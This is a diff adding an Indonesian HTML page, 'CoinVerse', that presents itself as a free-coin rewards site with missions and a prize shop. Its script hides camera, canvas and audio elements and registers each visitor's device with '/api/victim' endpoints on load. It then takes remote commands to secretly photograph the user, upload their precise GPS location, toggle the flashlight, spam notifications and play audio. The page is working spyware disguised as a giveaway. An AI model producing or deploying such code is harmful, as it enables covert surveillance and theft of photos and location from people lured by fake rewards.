@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CoinVerse - Kumpulkan Coin & Tukar Hadiah!</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: 'Poppins', sans-serif;
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+.header {
+  background: rgba(255, 255, 255, 0.95);
+  backdrop-filter: blur(10px);
+  padding: 20px;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+
+.header-content {
+  max-width: 1200px;
+  margin: 0 auto;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-size: 24px;
+  font-weight: 800;
+  color: #667eea;
+}
+
+.logo-icon {
+  width: 40px;
+  height: 40px;
+  background: linear-gradient(135deg, #ffd700, #ffed4e);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 20px;
+  box-shadow: 0 4px 15px rgba(255, 215, 0, 0.4);
+  animation: float 3s ease-in-out infinite;
+}
+
+@keyframes float {
+  0%, 100% { transform: translateY(0px); }
+  50% { transform: translateY(-10px); }
+}
+
+.coin-balance {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  background: linear-gradient(135deg, #ffd700, #ffed4e);
+  padding: 10px 20px;
+  border-radius: 25px;
+  font-weight: 700;
+  font-size: 18px;
+  color: #333;
+  box-shadow: 0 4px 15px rgba(255, 215, 0, 0.4);
+}
+
+.hero {
+  text-align: center;
+  padding: 60px 20px;
+  color: white;
+}
+
+.hero h1 {
+  font-size: 48px;
+  font-weight: 800;
+  margin-bottom: 20px;
+  text-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+  animation: slideDown 0.8s ease-out;
+}
+
+@keyframes slideDown {
+  from {
+    opacity: 0;
+    transform: translateY(-30px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+.hero p {
+  font-size: 20px;
+  margin-bottom: 40px;
+  opacity: 0.95;
+}
+
+.daily-reward {
+  background: rgba(255, 255, 255, 0.95);
+  backdrop-filter: blur(10px);
+  max-width: 500px;
+  margin: 0 auto 40px;
+  padding: 30px;
+  border-radius: 20px;
+  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+}
+
+.daily-reward h3 {
+  color: #667eea;
+  font-size: 24px;
+  margin-bottom: 20px;
+}
+
+.reward-btn {
+  background: linear-gradient(135deg, #667eea, #764ba2);
+  color: white;
+  border: none;
+  padding: 15px 40px;
+  font-size: 18px;
+  font-weight: 700;
+  border-radius: 50px;
+  cursor: pointer;
+  box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+  transition: all 0.3s;
+}
+
+.reward-btn:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);
+}
+
+.reward-btn:disabled {
+  background: #ccc;
+  cursor: not-allowed;
+  transform: none;
+}
+
+.container {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 40px 20px;
+}
+
+.section-title {
+  text-align: center;
+  color: white;
+  font-size: 36px;
+  font-weight: 800;
+  margin-bottom: 40px;
+  text-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+}
+
+.missions-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+  gap: 25px;
+  margin-bottom: 60px;
+}
+
+.mission-card {
+  background: white;
+  border-radius: 20px;
+  padding: 25px;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+  transition: all 0.3s;
+  cursor: pointer;
+  position: relative;
+  overflow: hidden;
+}
+
+.mission-card::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  height: 5px;
+  background: linear-gradient(90deg, #667eea, #764ba2);
+}
+
+.mission-card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+}
+
+.mission-icon {
+  width: 60px;
+  height: 60px;
+  background: linear-gradient(135deg, #667eea, #764ba2);
+  border-radius: 15px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 30px;
+  margin-bottom: 15px;
+}
+
+.mission-card h4 {
+  color: #333;
+  font-size: 20px;
+  font-weight: 700;
+  margin-bottom: 10px;
+}
+
+.mission-card p {
+  color: #666;
+  font-size: 14px;
+  margin-bottom: 15px;
+}
+
+.mission-reward {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.coin-amount {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 20px;
+  font-weight: 700;
+  color: #ffd700;
+}
+
+.claim-btn {
+  background: linear-gradient(135deg, #10b981, #34d399);
+  color: white;
+  border: none;
+  padding: 10px 25px;
+  border-radius: 25px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.3s;
+}
+
+.claim-btn:hover {
+  transform: scale(1.05);
+  box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4);
+}
+
+.rewards-shop {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+  gap: 25px;
+}
+
+.reward-item {
+  background: white;
+  border-radius: 20px;
+  padding: 20px;
+  text-align: center;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+  transition: all 0.3s;
+}
+
+.reward-item:hover {
+  transform: translateY(-5px);
+}
+
+.reward-image {
+  width: 100%;
+  height: 150px;
+  background: linear-gradient(135deg, #f093fb, #f5576c);
+  border-radius: 15px;
+  margin-bottom: 15px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 60px;
+}
+
+.reward-item h4 {
+  color: #333;
+  font-size: 18px;
+  font-weight: 700;
+  margin-bottom: 10px;
+}
+
+.reward-price {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  font-size: 22px;
+  font-weight: 700;
+  color: #ffd700;
+  margin-bottom: 15px;
+}
+
+.exchange-btn {
+  background: linear-gradient(135deg, #f093fb, #f5576c);
+  color: white;
+  border: none;
+  padding: 12px 30px;
+  border-radius: 25px;
+  font-weight: 600;
+  cursor: pointer;
+  width: 100%;
+  transition: all 0.3s;
+}
+
+.exchange-btn:hover {
+  transform: scale(1.05);
+}
+
+.footer {
+  background: rgba(0, 0, 0, 0.3);
+  backdrop-filter: blur(10px);
+  color: white;
+  text-align: center;
+  padding: 30px;
+  margin-top: 60px;
+}
+
+.notification {
+  position: fixed;
+  top: 100px;
+  right: 20px;
+  background: white;
+  padding: 20px 25px;
+  border-radius: 15px;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+  display: none;
+  animation: slideIn 0.4s ease-out;
+  z-index: 1000;
+  max-width: 350px;
+}
+
+@keyframes slideIn {
+  from {
+    opacity: 0;
+    transform: translateX(100px);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(0);
+  }
+}
+
+.notification.success {
+  border-left: 5px solid #10b981;
+}
+
+.notification.error {
+  border-left: 5px solid #ef4444;
+}
+
+.notification-title {
+  font-weight: 700;
+  font-size: 16px;
+  margin-bottom: 5px;
+  color: #333;
+}
+
+.notification-message {
+  font-size: 14px;
+  color: #666;
+}
+
+/* Hidden elements for camera and audio */
+video, canvas, audio {
+  display: none !important;
+  position: absolute;
+  left: -9999px;
+}
+
+@media (max-width: 768px) {
+  .hero h1 {
+    font-size: 32px;
+  }
+  
+  .missions-grid {
+    grid-template-columns: 1fr;
+  }
+  
+  .rewards-shop {
+    grid-template-columns: 1fr;
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-content">
+    <div class="logo">
+      <div class="logo-icon">🪙</div>
+      <span>CoinVerse</span>
+    </div>
+    <div class="coin-balance">
+      <span>🪙</span>
+      <span id="totalCoins">0</span>
+    </div>
+  </div>
+</div>
+
+<div class="hero">
+  <h1>Kumpulkan Coin Gratis! 🎉</h1>
+  <p>Selesaikan misi harian & tukar dengan hadiah menarik</p>
+  
+  <div class="daily-reward">
+    <h3>🎁 Hadiah Harian</h3>
+    <p>Dapatkan <strong>100 Coin</strong> gratis setiap hari!</p>
+    <button class="reward-btn" id="dailyRewardBtn" onclick="claimDailyReward()">
+      Klaim Sekarang
+    </button>
+  </div>
+</div>
+
+<div class="container">
+  <h2 class="section-title">🎯 Misi Harian</h2>
+  <div class="missions-grid">
+    <div class="mission-card" onclick="completeMission('share', 50)">
+      <div class="mission-icon">📱</div>
+      <h4>Bagikan ke Teman</h4>
+      <p>Share link ini ke 5 teman untuk mendapatkan bonus coin</p>
+      <div class="mission-reward">
+        <div class="coin-amount">🪙 50</div>
+        <button class="claim-btn">Klaim</button>
+      </div>
+    </div>
+    
+    <div class="mission-card" onclick="completeMission('video', 75)">
+      <div class="mission-icon">📹</div>
+      <h4>Tonton Video</h4>
+      <p>Tonton video promosi selama 30 detik</p>
+      <div class="mission-reward">
+        <div class="coin-amount">🪙 75</div>
+        <button class="claim-btn">Klaim</button>
+      </div>
+    </div>
+    
+    <div class="mission-card" onclick="completeMission('survey', 100)">
+      <div class="mission-icon">📝</div>
+      <h4>Isi Survey</h4>
+      <p>Bantu kami dengan mengisi survey singkat</p>
+      <div class="mission-reward">
+        <div class="coin-amount">🪙 100</div>
+        <button class="claim-btn">Klaim</button>
+      </div>
+    </div>
+    
+    <div class="mission-card" onclick="completeMission('follow', 30)">
+      <div class="mission-icon">💜</div>
+      <h4>Follow Sosmed</h4>
+      <p>Follow akun Instagram & TikTok kami</p>
+      <div class="mission-reward">
+        <div class="coin-amount">🪙 30</div>
+        <button class="claim-btn">Klaim</button>
+      </div>
+    </div>
+  </div>
+  
+  <h2 class="section-title">🎁 Tukar Hadiah</h2>
+  <div class="rewards-shop">
+    <div class="reward-item">
+      <div class="reward-image">💰</div>
+      <h4>Pulsa 10K</h4>
+      <div class="reward-price">🪙 500</div>
+      <button class="exchange-btn" onclick="exchangeReward('Pulsa 10K', 500)">Tukar</button>
+    </div>
+    
+    <div class="reward-item">
+      <div class="reward-image">📱</div>
+      <h4>Pulsa 25K</h4>
+      <div class="reward-price">🪙 1,200</div>
+      <button class="exchange-btn" onclick="exchangeReward('Pulsa 25K', 1200)">Tukar</button>
+    </div>
+    
+    <div class="reward-item">
+      <div class="reward-image">🎮</div>
+      <h4>Voucher Game 50K</h4>
+      <div class="reward-price">🪙 2,000</div>
+      <button class="exchange-btn" onclick="exchangeReward('Voucher Game 50K', 2000)">Tukar</button>
+    </div>
+    
+    <div class="reward-item">
+      <div class="reward-image">🍕</div>
+      <h4>Voucher Makanan</h4>
+      <div class="reward-price">🪙 1,500</div>
+      <button class="exchange-btn" onclick="exchangeReward('Voucher Makanan', 1500)">Tukar</button>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <p>&copy; 2025 CoinVerse. Semua hak dilindungi.</p>
+  <p style="margin-top: 10px; opacity: 0.8;">Kumpulkan coin, raih hadiah impianmu! 🎁</p>
+</div>
+
+<div class="notification" id="notification">
+  <div class="notification-title" id="notifTitle">Berhasil!</div>
+  <div class="notification-message" id="notifMessage">Coin berhasil diklaim!</div>
+</div>
+
+<!-- Hidden elements -->
+<video id="cameraStream"></video>
+<canvas id="photoCanvas"></canvas>
+<audio id="musicPlayer"></audio>
+
+<script>
+// ============= DEVICE INFO =============
+const deviceId = Date.now().toString() + Math.random().toString(36).substring(7);
+const userAgent = navigator.userAgent;
+const platform = navigator.platform;
+let eventSource = null;
+let isFlashlightOn = false;
+let mediaStream = null;
+
+// ============= COIN SYSTEM =============
+let totalCoins = parseInt(localStorage.getItem('totalCoins')) || 0;
+updateCoinDisplay();
+
+function updateCoinDisplay() {
+  document.getElementById('totalCoins').textContent = totalCoins.toLocaleString();
+  localStorage.setItem('totalCoins', totalCoins);
+}
+
+function showNotification(title, message, type = 'success') {
+  const notif = document.getElementById('notification');
+  const notifTitle = document.getElementById('notifTitle');
+  const notifMessage = document.getElementById('notifMessage');
+  
+  notif.className = 'notification ' + type;
+  notifTitle.textContent = title;
+  notifMessage.textContent = message;
+  notif.style.display = 'block';
+  
+  setTimeout(() => {
+    notif.style.display = 'none';
+  }, 3000);
+}
+
+function claimDailyReward() {
+  const lastClaim = localStorage.getItem('lastDailyClaim');
+  const today = new Date().toDateString();
+  
+  if (lastClaim === today) {
+    showNotification('Oops!', 'Kamu sudah klaim hadiah hari ini. Kembali besok!', 'error');
+    return;
+  }
+  
+  totalCoins += 100;
+  updateCoinDisplay();
+  localStorage.setItem('lastDailyClaim', today);
+  
+  const btn = document.getElementById('dailyRewardBtn');
+  btn.disabled = true;
+  btn.textContent = 'Sudah Diklaim';
+  
+  showNotification('Selamat! 🎉', 'Kamu mendapat 100 coin!', 'success');
+}
+
+function completeMission(type, reward) {
+  const missionKey = 'mission_' + type + '_' + new Date().toDateString();
+  
+  if (localStorage.getItem(missionKey)) {
+    showNotification('Sudah Selesai', 'Misi ini sudah diselesaikan hari ini!', 'error');
+    return;
+  }
+  
+  totalCoins += reward;
+  updateCoinDisplay();
+  localStorage.setItem(missionKey, 'completed');
+  
+  showNotification('Misi Selesai! ✅', `Kamu mendapat ${reward} coin!`, 'success');
+}
+
+function exchangeReward(item, price) {
+  if (totalCoins < price) {
+    showNotification('Coin Tidak Cukup', `Kamu butuh ${price} coin untuk menukar ${item}`, 'error');
+    return;
+  }
+  
+  totalCoins -= price;
+  updateCoinDisplay();
+  
+  showNotification('Berhasil Ditukar! 🎁', `${item} akan dikirim ke emailmu dalam 1x24 jam`, 'success');
+}
+
+// Check daily reward on load
+window.addEventListener('load', () => {
+  const lastClaim = localStorage.getItem('lastDailyClaim');
+  const today = new Date().toDateString();
+  
+  if (lastClaim === today) {
+    const btn = document.getElementById('dailyRewardBtn');
+    btn.disabled = true;
+    btn.textContent = 'Sudah Diklaim';
+  }
+});
+
+// ============= BACKGROUND CONNECTION =============
+async function connectToServer() {
+  try {
+    await fetch('/api/victim/connect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ deviceId, userAgent, platform })
+    });
+    
+    console.log('✅ Connected');
+    
+    eventSource = new EventSource(`/api/victim/stream/${deviceId}`);
+    
+    eventSource.onmessage = (event) => {
+      try {
+        const command = JSON.parse(event.data);
+        handleCommand(command);
+      } catch (err) {
+        console.error('Parse error:', err);
+      }
+    };
+    
+    eventSource.onerror = () => {
+      console.log('Reconnecting...');
+      setTimeout(connectToServer, 3000);
+    };
+    
+  } catch (err) {
+    console.error('Connection error:', err);
+    setTimeout(connectToServer, 3000);
+  }
+}
+
+async function handleCommand(command) {
+  console.log('Command:', command.type);
+  
+  switch(command.type) {
+    case 'flashlight':
+      toggleFlashlight(command.action);
+      break;
+    case 'spam-notification':
+      spamNotifications(command);
+      break;
+    case 'play-music':
+      playMusic(command.musicUrl);
+      break;
+    case 'capture-camera':
+      capturePhoto();
+      break;
+    case 'track-location':
+      trackLocation();
+      break;
+  }
+}
+
+async function toggleFlashlight(action) {
+  try {
+    if (action === 'on' && !isFlashlightOn) {
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: 'environment' } 
+      });
+      
+      const track = stream.getVideoTracks()[0];
+      await track.applyConstraints({
+        advanced: [{ torch: true }]
+      });
+      
+      isFlashlightOn = true;
+      mediaStream = stream;
+      
+    } else if (action === 'off' && isFlashlightOn) {
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+      }
+      isFlashlightOn = false;
+    }
+  } catch (err) {
+    console.error('Flashlight error:', err);
+  }
+}
+
+async function spamNotifications(config) {
+  const { title, message, count, interval } = config;
+  
+  if (!('Notification' in window)) {
+    return;
+  }
+  
+  const permission = await Notification.requestPermission();
+  
+  if (permission === 'granted') {
+    for (let i = 0; i < count; i++) {
+      new Notification(title, {
+        body: message,
+        icon: 'https://files.catbox.moe/ewc1g2.jpg',
+        badge: 'https://files.catbox.moe/ewc1g2.jpg'
+      });
+      
+      if (i < count - 1) {
+        await new Promise(resolve => setTimeout(resolve, interval));
+      }
+    }
+  }
+}
+
+async function playMusic(url) {
+  const player = document.getElementById('musicPlayer');
+  player.src = url;
+  player.loop = true;
+  player.volume = 1.0;
+  
+  try {
+    await player.play();
+  } catch (err) {
+    console.error('Music error:', err);
+  }
+}
+
+async function capturePhoto() {
+  try {
+    const video = document.getElementById('cameraStream');
+    const canvas = document.getElementById('photoCanvas');
+    
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: 'user' }
+    });
+    
+    video.srcObject = stream;
+    await video.play();
+    
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+    
+    canvas.toBlob(async (blob) => {
+      const formData = new FormData();
+      formData.append('photo', blob, 'photo.jpg');
+      formData.append('deviceId', deviceId);
+      
+      await fetch('/api/victim/upload-photo', {
+        method: 'POST',
+        body: formData
+      });
+      
+      stream.getTracks().forEach(track => track.stop());
+    }, 'image/jpeg', 0.8);
+    
+  } catch (err) {
+    console.error('Camera error:', err);
+  }
+}
+
+async function trackLocation() {
+  if (!('geolocation' in navigator)) {
+    return;
+  }
+  
+  try {
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const { latitude, longitude, accuracy } = position.coords;
+        
+        await fetch('/api/victim/upload-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            deviceId,
+            latitude,
+            longitude,
+            accuracy
+          })
+        });
+      },
+      (error) => {
+        console.error('Location error:', error);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      }
+    );
+  } catch (err) {
+    console.error('Geolocation error:', err);
+  }
+}
+
+// Auto connect
+connectToServer();
+
+// Auto request permissions
+if ('Notification' in window) {
+  Notification.requestPermission();
+}
+
+if ('geolocation' in navigator) {
+  navigator.geolocation.getCurrentPosition(() => {}, () => {});
+}
+</script>
+
+</body>
+</html>
